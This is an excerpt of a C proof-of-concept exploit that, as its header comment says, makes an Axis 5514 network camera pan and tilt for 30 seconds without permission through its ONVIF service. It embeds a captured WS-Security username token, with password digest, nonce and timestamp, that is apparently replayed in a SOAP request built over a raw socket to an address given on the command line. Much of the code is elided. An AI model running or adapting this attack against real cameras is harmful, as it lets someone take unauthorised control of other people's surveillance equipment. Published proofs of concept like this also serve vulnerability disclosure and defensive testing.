/**************************************************************************
 *
 * This PoC shows the attacker can remotely make Axis camera 5514 turn around on Pan&Tilt for 30 senconds without permission.
   the PoC needs that ONVIF service start in Axis camera 5514
 * usage: axis_5514_continuousmove [camera_address]
          [axis_5514_continuousmove 192.168.1.188]
  ...
  "<s:Header>"
    "<wsse:Security xmlns:wsse=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd\" xmlns:wsu=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\">"
      "<wsse:UsernameToken>"
        ...
        "<wsse:Password Type=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest\">ttv3nD7yTgkF/MAKvwrpuRQSCHM=</wsse:Password>"
        "<wsse:Nonce>9Abpbd6YpZiab10iJBUziw==</wsse:Nonce>"
        "<wsu:Created>2016-01-06T00:25:25Z</wsu:Created>"
      "</wsse:UsernameToken>"
    "</wsse:Security>"
  "</s:Header>"
...
int main(int argc, char* argv[])
{
    ...
    struct sockaddr_in serv_addr;  /* camera server address */
    ...
    if (argc == 1)
    {
		url="http://192.168.1.XX/onvif/services";    //my camera url in test
    }else{
		url_len = sprintf(url_buf, "http://%s/onvif/services",argv[1]);//address of Pan&Tile control
		url_buf[url_len]=0;
		url=url_buf;
	}
	...
	send_len = sprintf(data_buf,
		...
		"SOAPAction:\"http://%s/onvif/services\"\r\n"
		"Host: %s\r\n"
		"Content-Length: %d\r\n"
		"\r\n"
